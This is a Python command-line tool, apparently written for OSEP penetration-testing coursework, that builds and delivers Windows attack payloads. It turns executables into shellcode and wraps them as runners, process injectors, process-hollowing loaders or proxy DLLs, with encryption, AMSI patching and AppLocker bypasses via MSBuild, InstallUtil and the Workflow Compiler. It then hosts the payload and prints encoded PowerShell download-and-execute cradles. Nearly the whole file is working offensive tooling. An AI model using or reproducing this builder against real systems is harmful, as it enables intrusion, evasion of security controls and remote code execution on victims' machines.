import os
import argparse
import tempfile
import shutil

from tradecraft import c, cs, ps
from tradecraft.utils import *

from urllib.parse import urlparse

input_format = ['', '.exe', '.dll', '.raw', '.bin', '.txt']
output_format = ['', '.exe', '.dll', '.ps1', '.ps', '.js', '.xml']

def main():
    parser = argparse.ArgumentParser(description='Tradcraft for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
    
    methods = parser.add_mutually_exclusive_group(required=True)

    parser.add_argument('-i', '--input', required=True, help=f'input file format: ({', '.join(input_format[1:])})')
    parser.add_argument('-o', '--output', required=True, help=f'output file format: ({', '.join(output_format[1:])})')
    parser.add_argument('-s', '--server', type=urlparse, help='stage the payload')
    parser.add_argument('-c', '--command', help=f'command to execute')
    parser.add_argument('-a', '--args', nargs='+', help='payload arguments')
    
    methods.add_argument('--run', action='store_true', help='shellcode runner {cs, ps1, c}') 

    methods.add_argument('--inject', action='store_true', help='shellcode process injector {cs, ps1}')
    methods.add_argument('--hollow', action='store_true', help='shellcode process hollowing {cs}') 
    parser.add_argument('--process', default='explorer.exe', help='target process')

    methods.add_argument('--proxy', action='store_true', help='dll proxying {c}')
    parser.add_argument('--dll', help='path to the DLL to generate a proxy for')
    parser.add_argument('--dll-path', metavar='PATH', default='C:\\Windows\\System32', help='path to original path')

    parser.add_argument('--reflection', action='store_true', help='assembly reflection {cs, ps1}')
    parser.add_argument('--amsi', action='store_true', help='amsi patch {cs, ps1}')

    parser.add_argument('--applocker', nargs='?', choices=['msbuild', 'workflow_compiler', 'installutil'], type=str.lower, const='msbuild', help='applocker bypass {cs}')
    parser.add_argument('--applocker-path', metavar='PATH', default='C:\\Windows\\Tasks', help='applocker bypass {cs}')
    
    parser.add_argument('--platform', choices=['windows', 'linux'], type=str.lower, default='windows', help='payload platform')
    parser.add_argument('--arch', choices=['x32', 'x64', 'any'], type=str.lower, default='x64', help='payload architecture')

    parser.add_argument('--delay', type=int, help='delay payload execution')
    parser.add_argument('-e', '--encrypt', choices=[None, 'AES', 'XOR', 'ROT'], default='AES', type=lambda v: None if v.upper() == "none" else v.upper(), help='encrypt the payload')
    parser.add_argument('--hide', help='hide windows console', action="store_true")

    parser.add_argument('-q', '--quiet', help='hide banner', action="store_true")
    parser.add_argument('-v', '--verbose', help='verbose output', action="count")

    args = parser.parse_args()

    rootdir = os.path.dirname(__file__)
    tempdir = tempfile.TemporaryDirectory()
    target = args.output if not args.server else os.path.join(tempdir.name, os.path.basename(args.output))

    if not args.quiet:
        print_banner()
    
    input_ext = os.path.splitext(args.input)[1]
    output_ext = os.path.splitext(args.output)[1]
    
    if input_ext not in input_format:
        parser.error('supported input extensions: ' + ', '.join(input_format[1:]))
    if output_ext not in output_format:
        parser.error('supported output extensions : ' + ', '.join(input_format[1:]))

    if args.platform == 'linux' and (args.inject or args.hollow or args.proxy):
        parser.error('supported platform: windows extensions are: ')

    if args.reflection and not args.server:
        parser.error('reflection requires server option')

    if args.inject or args.hollow or args.run:
        if input_ext in ['.exe', '.dll']:
            print_info('Generating shellcode using donut')
            donut = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--input:'+args.input, '--output:'+os.path.join(tempdir.name, 'shellcode.bin')]
            if args.arch == 'x32':
                donut.append('--arch:1')
            elif args.arch == 'x64':
                donut.append('--arch:2')
            else:
                donut.append('--arch:3')
            
            if not args.amsi:
                donut.append('--bypass:1')
                
            build(donut, args.verbose)

            input = os.path.join(tempdir.name, 'shellcode.bin')

        if input_ext in ['', '.bin', '.raw']:
            input = args.input
        
        with open(input, 'rb') as f:
            shellcode = f.read()

        if output_ext in ['.exe', '.dll']:
            if args.run:
                print_info('Generating shellcode runner payload')
                code = cs.shellcode_runner(args, shellcode)
            elif args.inject:
                print_info('Generating process injection payload')
                code = cs.process_injection(args, shellcode)
            elif args.hollow:
                print_info('Generating process hollowing  payload')
                code = cs.process_hollowing(args, shellcode)
            else:
                parser.error(f'output extension {output_ext} not supported')
                exit(-1)
            
            with open(os.path.join(tempdir.name,'program.cs'), 'w') as f:
                f.write(code)
            
            arch = args.arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
            mcs = ['mcs', '-unsafe', '-platform:'+arch, os.path.join(tempdir.name,'program.cs'), '-out:'+target]
            defines = []
            if args.delay:
                defines.append('DELAY')
            if args.encrypt:
                defines.append(args.encrypt.upper())
            
            if defines:
                mcs.append('-define:'+';'.join(defines))

            if output_ext == '.dll':
                mcs.append('-target:library')
            if args.hide:
                mcs.append('-target:winexe')

            print_info('Building payload')
            build(mcs, args.verbose)
            print_success('Payload generated')
        
        # remake
        elif output_ext in ['.ps1', '.ps']:
            if args.run:
                print_info('Generating shellcode runner payload')
                code = ps.shellcode_runner(args, shellcode)
            elif args.inject:
                code = ps.process_injection(args, shellcode)
            else:
                print_info(f'Generating process injection payload')
                parser.error(f'output extension {output_ext} not supported')
                exit(-1)
            
            with open(target, 'w') as f:
                f.write(code)
            print_success('Payload generated')

    elif args.proxy:
        dll_code, def_code = c.dll_proxy(args.proxying_dll, args.proxying_path)

        with open(os.path.join(tempdir.name,'proxy.c'), 'w') as f:
            f.write(dll_code)
        
        with open(os.path.join(tempdir.name,'proxy.def'), 'w') as f:
            f.write(def_code)

        print_info('Generating dll proxying payload')

        mingw = ['x86_64-w64-mingw32-gcc', '-shared', os.path.join(tempdir.name,'proxy.c'), os.path.join(tempdir.name,'proxy.def'), '-o', target]
        build(mingw, args.verbose)
        print_success('Payload generated')
    
    if args.server:
        scheme = args.server.scheme if args.server.scheme in ['http', 'https'] else 'http'
        hostname = args.server.hostname
        port = args.server.port if args.server.port else 80 if scheme == 'http' else 443
        target_path = os.path.basename(target)
        certfile = os.path.join(rootdir, 'tradecraft/ssl/cert.pem') if scheme == 'https' else None
        keyfile = os.path.join(rootdir, 'tradecraft/ssl/key.pem') if scheme == 'https' else None
        httpd = HTTPServer(hostname, port, tempdir.name, certfile, keyfile)
        url = f'{scheme}://{hostname}:{port}'
        
        if output_ext in ['.exe', '.dll']:
            if args.applocker:
                print_info(f'Generating {args.applocker} payload')
                cs_code, xml_code = cs.applocker(args, f'{url}/{target_path}')
                if args.applocker.lower() == 'msbuild':
                    applocker_xml = os.path.join(tempdir.name,'build.xml')
                    with open(applocker_xml, 'w') as f:
                        f.write(xml_code)
                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build.xml","{args.applocker_path}\\build.xml");C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe "{args.applocker_path}\\build.xml"'
                
                if args.applocker.lower() == 'workflow_compiler':
                    applocker_cs = os.path.join(tempdir.name,'build.cs')
                    applocker_xml = os.path.join(tempdir.name,'build.xml')
                    with open(applocker_cs, 'w') as f:
                        f.write(cs_code)
                    with open(applocker_xml, 'w') as f:
                        f.write(xml_code)
                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build.xml","{args.applocker_path}\\build.xml");(New-Object System.Net.WebClient).DownloadFile("{url}/build.cs","{args.applocker_path}\\build.cs");C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe "{args.applocker_path}\\build.xml" results.xml'
                
                if args.applocker.lower() == 'installutil':
                    applocker_cs = os.path.join(tempdir.name,'build.cs')
                    applocker_target = os.path.join(tempdir.name,'build'+output_ext)
                    with open(applocker_cs, 'w') as f:
                        f.write(cs_code)
                    mcs = ['mcs', '-r:System.Configuration.Install.dll', '-platform:'+arch, applocker_cs, '-out:'+applocker_target]
                    if output_ext == '.dll':
                        mcs.append('-target:library')
                    if args.hide:
                        mcs.append('-target:winexe')
                    build(mcs, args.verbose)
                    ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build{output_ext}","{args.applocker_path}\\build.xml");C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U "{args.applocker_path}\\build.xml"'
            elif args.reflection:
                print_info('Generating reflection payload')
                code = ps.assembly_reflection(f'{url}/{target_path}')
                reflection = os.path.splitext(target)[0] + '.ps1'
                with open(reflection, 'w') as f:
                    f.write(code)
                reflection_path = os.path.basename(reflection)
                ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{reflection_path}") | IEX'
            
            else:
                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}"); .\\{target_path}'    

        elif output_ext in ['.ps1', '.ps']:
            print_info('Generating powershell payload')
            ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{target_path}") | IEX'
        
        else:
            ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}")'

        print(f'powershell -enc {ps_encode(ps_command)}')
        httpd.serve_forever()
        shutil.copy(target, args.output) 

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print_warn('Build failed:')
        print_error(str(e))